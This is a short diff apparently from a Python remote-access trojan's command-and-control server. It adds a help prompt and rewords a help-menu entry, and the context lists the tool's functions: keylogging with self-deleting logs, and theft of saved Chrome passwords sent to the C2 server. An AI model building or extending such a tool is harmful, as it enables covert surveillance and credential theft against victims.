@@ -119,7 +119,7 @@ def server():
 
 	trgt, ip = sock.accept()
 	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
-
+	print(colored("[+] For help section, type: 'help'", 'green'))
 	print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))
 
 
@@ -192,7 +192,7 @@ keylog_dump                   :    To print keystrokes
 
 keylog_off                    :    To close keylogger and self destruct the logged file
 
-spoof_passwd                  :    To spoof password as a file from trgt machine (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2Server
+spoof_passwd                  :    To spoof password as a file from trgt machine's browser (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2Server
 (windows only)
 
 spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
